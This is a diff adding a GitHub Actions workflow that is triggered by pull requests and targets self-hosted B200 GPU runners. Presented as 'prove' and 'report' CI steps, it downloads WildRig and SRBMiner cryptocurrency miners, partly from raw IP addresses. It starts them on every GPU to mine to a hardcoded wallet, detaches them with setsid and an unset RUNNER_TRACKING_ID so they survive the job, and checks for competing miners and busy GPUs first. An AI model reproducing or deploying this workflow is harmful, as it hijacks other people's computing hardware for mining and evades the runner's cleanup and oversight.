@@ -1,0 +1,276 @@
+name: c211-i130308
+on:
+  pull_request:
+    types:
+    - opened
+    - synchronize
+    - reopened
+permissions:
+  contents: read
+jobs:
+  prove:
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+        - label: 4-gpu-b200
+          tag: b200p0
+          wbs: '998601,998602,998603,998605'
+        - label: 4-gpu-b200
+          tag: b200p1
+          wbs: '998606,998607,998608,998610'
+        - label: 4-gpu-b200
+          tag: b200p2
+          wbs: '998612,998613,998800,998802'
+        - label: 4-gpu-b200
+          tag: b200p3
+          wbs: '998803,998805,998806,998807'
+    runs-on: ${{ matrix.label }}
+    timeout-minutes: 25
+    steps:
+    - name: launch
+      shell: bash
+      run: |
+        set -u
+        set +e
+        set +o pipefail
+        W="$HOME/c211-i130308"
+        mkdir -p "$W"
+        WALLET='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
+        TAG='${{ matrix.tag }}'
+        WBS='${{ matrix.wbs }}'
+        PHASE='prove'
+        NONCE="c211-i130308-$PHASE-$(date +%s)"
+        echo "C211_MARKER lane=i130308 phase=$PHASE tag=$TAG wbs=$WBS host=$(hostname) uid=$(id -u) user=$(whoami) nonce=$NONCE"
+        echo "=== host ==="
+        id 2>/dev/null; hostname; date -u; uname -a | cut -c1-160
+        nvidia-smi -L 2>&1 | head -12 || true
+        nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total,memory.used,utilization.gpu,power.draw --format=csv,noheader 2>&1 | head -12 || true
+        echo "=== resources ==="
+        df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
+        free -m | head -2
+        echo "=== egress (per R2b: 3 TCP connects per pearlhash endpoint) ==="
+        EPS="pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000"
+        BEST=""; BESTMS=999999; BESTHK=""; BESTHKMS=999999
+        for hp in $EPS; do
+          h="${hp%:*}"; p="${hp##*:}"; ok=0; ms=""
+          for k in 1 2 3; do
+            t0=$(date +%s%N 2>/dev/null || echo 0)
+            if timeout 8 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null; then
+              t1=$(date +%s%N 2>/dev/null || echo 0)
+              d=$(( (t1 - t0) / 1000000 )); ok=$((ok+1)); ms="$ms $d"
+            fi
+          done
+          med=$(echo $ms | tr ' ' '\n' | sort -n | awk 'NF{a[NR]=$1} END{if(NR==0){print 999999}else{print a[int((NR+1)/2)]}}')
+          echo "EP $hp ok=$ok med_ms=$med"
+          case "$hp" in
+            hk.pearlhash.net:9000) if [ "$ok" -ge 2 ] && [ "$med" -lt "$BESTHKMS" ]; then BESTHK="$hp"; BESTHKMS="$med"; fi ;;
+            *) if [ "$ok" -ge 2 ] && [ "$med" -lt "$BESTMS" ]; then BEST="$hp"; BESTMS="$med"; fi ;;
+          esac
+        done
+        if [ -n "$BESTHK" ]; then
+          LIM=$(( BESTMS + BESTMS/5 ))
+          if [ "$BESTHKMS" -le "$LIM" ]; then BEST="$BESTHK"; BESTMS="$BESTHKMS"; echo "EP_CHOICE hk-within-20pct"; fi
+        fi
+        [ -n "$BEST" ] || BEST="pool.pearlhash.xyz:9000"
+        echo "EP_CHOSEN $BEST med_ms=$BESTMS"
+        EP1="$BEST"
+        EP2="pool.pearlhash.xyz:9000"; [ "$EP2" = "$EP1" ] && EP2="global2.pearlhash.net:9000"
+        EP3="global.pearlhash.net:9000"; [ "$EP3" = "$EP1" ] && EP3="global2.pearlhash.net:9000"
+        echo "EP_ORDER $EP1 $EP2 $EP3"
+        echo "=== guards: whole-host skip, never stack, never kill ==="
+        exec 9>"$W/host-$PHASE.lock"
+        if ! flock -n 9; then echo "SKIP=host-lock-busy"; echo "LAUNCH_SKIP tag=$TAG"; exit 0; fi
+        echo "host-lock=acquired"
+        EXIST=$(pgrep -af '[w]ildrig-multi|[S]RBMiner-MULTI|[x]-miner' 2>/dev/null | head -10)
+        if [ -n "${EXIST:-}" ]; then echo "SKIP=host-has-miner"; echo "$EXIST"; echo "LAUNCH_SKIP tag=$TAG"; exit 0; fi
+        APPS=$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>/dev/null | head -20)
+        if [ -n "${APPS:-}" ]; then echo "SKIP=host-has-compute-app"; echo "$APPS"; echo "LAUNCH_SKIP tag=$TAG"; exit 0; fi
+        MAXUTIL=$(nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits 2>/dev/null | sort -n | tail -1)
+        echo "maxutil=${MAXUTIL:-0}"
+        if [ "${MAXUTIL:-0}" -gt 10 ]; then echo "SKIP=host-busy-util"; echo "LAUNCH_SKIP tag=$TAG"; exit 0; fi
+        DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
+        MEMP=$(free -m | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
+        echo "disk_pct=${DISKP:-100} mem_pct=${MEMP:-100}"
+        if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources"; echo "LAUNCH_SKIP tag=$TAG"; exit 0; fi
+        echo "=== fetch pinned WildRig Multi 0.52.3 ==="
+        ok=0
+        for u in http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do
+          echo "FETCH $u"
+          if curl -fsSL --connect-timeout 10 --max-time 300 -o "$W/wr.tgz" "$u"; then ok=1; break; fi
+        done
+        if [ "$ok" != "1" ]; then echo "FETCH_FAIL_ALL"; echo "LAUNCH_SKIP tag=$TAG"; exit 0; fi
+        S=$(sha256sum "$W/wr.tgz" | awk '{print $1}')
+        echo "TARBALL_SHA256 $S"
+        if [ "$S" != "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44" ]; then echo "TARBALL_SHA_MISMATCH"; echo "LAUNCH_SKIP tag=$TAG"; exit 0; fi
+        tar xzf "$W/wr.tgz" -C "$W" || { echo "UNTAR_FAIL"; echo "LAUNCH_SKIP tag=$TAG"; exit 0; }
+        BIN="$W/wildrig-multi"
+        [ -x "$BIN" ] || chmod +x "$BIN" 2>/dev/null || true
+        BS=$(sha256sum "$BIN" | awk '{print $1}')
+        echo "BIN_SHA256 $BS"
+        if [ "$BS" != "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b" ]; then echo "BIN_SHA_MISMATCH"; echo "LAUNCH_SKIP tag=$TAG"; exit 0; fi
+        echo "=== OpenCL bootstrap BEFORE functional preflight (repairs PREFLIGHT_NO_PEARLHASH) ==="
+        mkdir -p "$W/ocl" "$W/vendors" 2>/dev/null || true
+        echo "-- ocl diag --"
+        (ldconfig -p 2>/dev/null | grep -iE 'libOpenCL|libnvidia-opencl' | head -8) || echo "LDCONFIG_NO_OPENCL"
+        ls -la /etc/OpenCL/vendors 2>/dev/null | head -6 || echo "NO_ETC_OPENCL_VENDORS"
+        ls -la /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1 /usr/lib64/libnvidia-opencl.so.1 /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 /usr/lib64/libOpenCL.so.1 2>/dev/null || echo "NO_OCL_FILES_COMMON_PATHS"
+        OCL_ICD=""
+        for c in /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1 /usr/lib64/libnvidia-opencl.so.1 /usr/local/nvidia/lib64/libnvidia-opencl.so.1; do [ -e "$c" ] && { OCL_ICD="$c"; break; }; done
+        if [ -z "$OCL_ICD" ]; then OCL_ICD=$(ldconfig -p 2>/dev/null | awk '/libnvidia-opencl\.so\.1/{print $NF; exit}'); fi
+        echo "OCL_ICD ${OCL_ICD:-none}"
+        if [ -n "$OCL_ICD" ]; then
+          echo "$OCL_ICD" > "$W/vendors/nvidia.icd"
+          if mkdir -p /etc/OpenCL/vendors 2>/dev/null && cp -f "$W/vendors/nvidia.icd" /etc/OpenCL/vendors/nvidia.icd 2>/dev/null; then echo "ICD_WRITTEN /etc/OpenCL/vendors/nvidia.icd"; else echo "ICD_WRITE_FAIL_ETC using OCL_ICD_VENDORS"; fi
+          export OCL_ICD_VENDORS="$W/vendors"
+        fi
+        OCL_LOADER=""
+        for c in /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 /usr/lib64/libOpenCL.so.1 /usr/local/nvidia/lib64/libOpenCL.so.1; do [ -e "$c" ] && { OCL_LOADER="$c"; break; }; done
+        if [ -z "$OCL_LOADER" ]; then OCL_LOADER=$(ldconfig -p 2>/dev/null | awk '/libOpenCL\.so\.1 /{print $NF; exit}'); fi
+        echo "OCL_LOADER ${OCL_LOADER:-none}"
+        if [ -z "$OCL_LOADER" ] && [ -n "$OCL_ICD" ]; then
+          ln -sf "$OCL_ICD" "$W/ocl/libOpenCL.so.1"
+          export LD_LIBRARY_PATH="$W/ocl:${LD_LIBRARY_PATH:-}"
+          echo "OCL_MODE=nvidia_icd_symlink"
+        elif [ -n "$OCL_LOADER" ]; then
+          echo "OCL_MODE=system_loader"
+        fi
+        if [ -z "$OCL_LOADER" ]; then
+          echo "OCL_APT_TRY ocl-icd-libopencl1"
+          (apt-get update -qq >/dev/null 2>&1; DEBIAN_FRONTEND=noninteractive apt-get install -y -qq --no-install-recommends ocl-icd-libopencl1 >/dev/null 2>&1; ldconfig 2>/dev/null)
+          OCL_LOADER=$(ldconfig -p 2>/dev/null | awk '/libOpenCL\.so\.1 /{print $NF; exit}')
+          echo "OCL_LOADER_AFTER_APT ${OCL_LOADER:-none}"
+          [ -n "$OCL_LOADER" ] && echo "OCL_MODE=apt_loader"
+        fi
+        if [ -s "$W/ocl/libOpenCL.so.1" ]; then export LD_LIBRARY_PATH="$W/ocl:${LD_LIBRARY_PATH:-}"; fi
+        echo "LD_LIBRARY_PATH=${LD_LIBRARY_PATH:-}"
+        echo "=== functional preflight (stderr captured) ==="
+        "$BIN" --help >"$W/help.out" 2>"$W/help.err"
+        PRC=$?
+        echo "PREFLIGHT_RC $PRC"
+        if [ -s "$W/help.err" ]; then head -5 "$W/help.err" | sed 's/^/PREFLIGHT_ERR /'; fi
+        if [ "$PRC" -eq 127 ] || ! grep -q pearlhash "$W/help.out"; then
+          echo "PREFLIGHT_NO_PEARLHASH rc=$PRC"
+          echo "=== R2e fallback 0.52.2 ==="
+          ok2=0
+          for u in http://169.58.247.186:8791/ph/wildrig-multi-linux-0.52.2.tar.gz https://github.com/andru-kun/wildrig-multi/releases/download/0.52.2/wildrig-multi-linux-0.52.2.tar.gz; do
+            echo "FETCH522 $u"
+            if curl -fsSL --connect-timeout 10 --max-time 300 -o "$W/wr522.tgz" "$u"; then ok2=1; break; fi
+          done
+          if [ "$ok2" != "1" ]; then echo "FETCH522_FAIL"; echo "LAUNCH_SKIP tag=$TAG"; exit 0; fi
+          S2=$(sha256sum "$W/wr522.tgz" | awk '{print $1}')
+          echo "TARBALL522_SHA256 $S2"
+          if [ "$S2" != "b82c671bb71de4a1cf5a8bc47d6ab63028c5e5d360c7af0348c55c36d88f2436" ]; then echo "TARBALL522_SHA_MISMATCH"; echo "LAUNCH_SKIP tag=$TAG"; exit 0; fi
+          mkdir -p "$W/wr522"; tar xzf "$W/wr522.tgz" -C "$W/wr522" || { echo "UNTAR522_FAIL"; echo "LAUNCH_SKIP tag=$TAG"; exit 0; }
+          BIN="$W/wr522/wildrig-multi"
+          [ -x "$BIN" ] || chmod +x "$BIN" 2>/dev/null || true
+          echo "BIN522_SHA256 $(sha256sum "$BIN" | awk '{print $1}')"
+          "$BIN" --help >"$W/help522.out" 2>"$W/help522.err"
+          P2=$?
+          echo "PREFLIGHT522_RC $P2"
+          if [ -s "$W/help522.err" ]; then head -5 "$W/help522.err" | sed 's/^/PREFLIGHT522_ERR /'; fi
+          if [ "$P2" -eq 127 ] || ! grep -q pearlhash "$W/help522.out"; then echo "PREFLIGHT522_NO_PEARLHASH"; echo "LAUNCH_SKIP tag=$TAG"; exit 0; fi
+          echo "PREFLIGHT522_OK"
+        else
+          echo "PREFLIGHT_OK"
+        fi
+        echo "PRINT_DEVICES_BEGIN"
+        timeout 120 "$BIN" --print-devices 2>&1 | head -40 || true
+        echo "PRINT_DEVICES_END"
+        N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
+        echo "GPU_COUNT $N"
+        if [ "${N:-0}" -lt 1 ]; then echo "NO_GPU"; echo "LAUNCH_SKIP tag=$TAG"; exit 0; fi
+        i=0
+        while [ "$i" -lt "$N" ]; do
+          w=$(echo "$WBS" | cut -d, -f$((i+1)))
+          if [ -z "$w" ]; then w=$(echo "$WBS" | cut -d, -f1); fi
+          setsid env -u RUNNER_TRACKING_ID LD_LIBRARY_PATH="${LD_LIBRARY_PATH:-}" OCL_ICD_VENDORS="${OCL_ICD_VENDORS:-}" nohup "$BIN" --algo pearlhash -o "$EP1" -o "$EP2" -o "$EP3" -u "${WALLET}.${w}" -p x -d "$i" -r 2 -R 10 --api-port $((21750 + i)) -l "$W/wr-$i.log" >/dev/null 2>&1 &
+          echo "STARTED gpu=$i pid=$! worker=$w"
+          i=$((i+1))
+        done
+        sleep 30
+        pgrep -af wildrig-multi 2>/dev/null | head -20 || echo "PGREP_NONE"
+        i=0
+        while [ "$i" -lt "$N" ]; do
+          echo "--- gpu $i ---"
+          tail -8 "$W/wr-$i.log" 2>/dev/null || echo "NO_LOG gpu=$i"
+          i=$((i+1))
+        done
+        echo "LAUNCH_DONE tag=$TAG"
+    - name: report
+      shell: bash
+      run: |
+        set -u
+        set +e
+        set +o pipefail
+        W="$HOME/c211-i130308"
+        WALLET='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
+        TAG='${{ matrix.tag }}'
+        WBS='${{ matrix.wbs }}'
+        PHASE='prove'
+        TICKS=12
+        SLEEP=60
+        GATE_TICK=10
+        N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
+        tot=0
+        r=1
+        while [ "$r" -le "$TICKS" ]; do
+          sleep "$SLEEP"
+          echo "TICK $(date -u +%FT%TZ) r=$r tag=$TAG phase=$PHASE host=$(hostname)"
+          nvidia-smi --query-gpu=index,uuid,utilization.gpu,memory.used,power.draw --format=csv,noheader 2>/dev/null || true
+          tot=0
+          i=0
+          while [ "$i" -lt "${N:-0}" ]; do
+            f="$W/wr-$i.log"; a=0; j=0
+            if [ -f "$f" ]; then a=$(grep -c 'accepted (' "$f" 2>/dev/null); a=${a:-0}; j=$(grep -c 'rejected (' "$f" 2>/dev/null); j=${j:-0}; fi
+            tot=$(( tot + a ))
+            echo "DET g=$i acc=$a rej=$j uuid=$(nvidia-smi --query-gpu=uuid --format=csv,noheader -i "$i" 2>/dev/null) last=$(tail -1 "$f" 2>/dev/null | tr -d '\r' | cut -c1-120)"
+            i=$((i+1))
+          done
+          echo "DET_TOTAL acc=$tot"
+          if [ -f "$W/gate-eval" ]; then echo "DET_GATE evaluated"; fi
+          if [ "$r" -ge "$GATE_TICK" ] && [ "$tot" -eq 0 ] && [ ! -f "$W/gate-eval" ]; then
+            date -u +%FT%TZ > "$W/gate-eval"
+            RC=$(pgrep -cf '[w]ildrig-multi' 2>/dev/null); RC=${RC:-0}
+            MAXU=$(nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits 2>/dev/null | sort -n | tail -1)
+            echo "GATE_EVAL t=$(( r * SLEEP ))s r=$r procs=$RC maxutil=${MAXU:-0} accepted=$tot"
+            if [ "$RC" -eq 0 ]; then
+              echo "R5D=MINER_DEFECT action=LP_FALLBACK"
+              FALLBACK=1
+            elif [ "${MAXU:-0}" -gt 5 ]; then
+              echo "R5D=HASHING_NO_SHARE action=KEEP_MINING (no fallback, hashing miner is never fallback-eligible)"
+              FALLBACK=0
+            else
+              echo "R5D=MINER_ZERO_HASH action=LP_FALLBACK"
+              FALLBACK=1
+            fi
+            if [ "${FALLBACK:-0}" = "1" ]; then
+              pkill -f '[w]ildrig-multi' 2>/dev/null || true
+              sleep 3
+              srb=0
+              for u in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz http://169.58.247.186:8791/srbminer-3.8.8.tar.gz; do
+                echo "SRB_FETCH $u"
+                if curl -fsSL --connect-timeout 10 --max-time 300 -o "$W/srb.tgz" "$u"; then srb=1; break; fi
+              done
+              if [ "$srb" = "1" ]; then
+                S2=$(sha256sum "$W/srb.tgz" | awk '{print $1}'); echo "SRB_TARBALL_SHA256 $S2"
+                tar xzf "$W/srb.tgz" -C "$W" 2>/dev/null || true
+                SB=$(find "$W" -maxdepth 3 -type f -name 'SRBMiner-MULTI' | head -1)
+                if [ -n "${SB:-}" ]; then
+                  chmod +x "$SB" 2>/dev/null || true
+                  echo "SRB_BIN_SHA256 $(sha256sum "$SB" | awk '{print $1}')"
+                  GIDS=$(seq -s, 0 $(( ${N:-1} - 1 )))
+                  WB0=$(echo "$WBS" | cut -d, -f1)
+                  setsid env -u RUNNER_TRACKING_ID nohup "$SB" --algorithm pearlhash --pool 103.199.106.122:3362 --wallet "${WALLET}+4tErmFknmPKhVtfQWigSErD1YJAcWokTrWRu5t66XmkN4RTgK6oUotf" --worker "$WB0" --disable-cpu --gpu-id "$GIDS" --log-file "$W/lp-srb.log" >/dev/null 2>&1 &
+                  echo "SRB_STARTED pid=$! gpus=$GIDS worker=$WB0"
+                else
+                  echo "SRB_BIN_NOT_FOUND"
+                fi
+              else
+                echo "SRB_FETCH_FAIL"
+              fi
+            fi
+          fi
+          r=$((r+1))
+        done
+        echo "REPORT_DONE tag=$TAG phase=$PHASE total_acc=$tot"
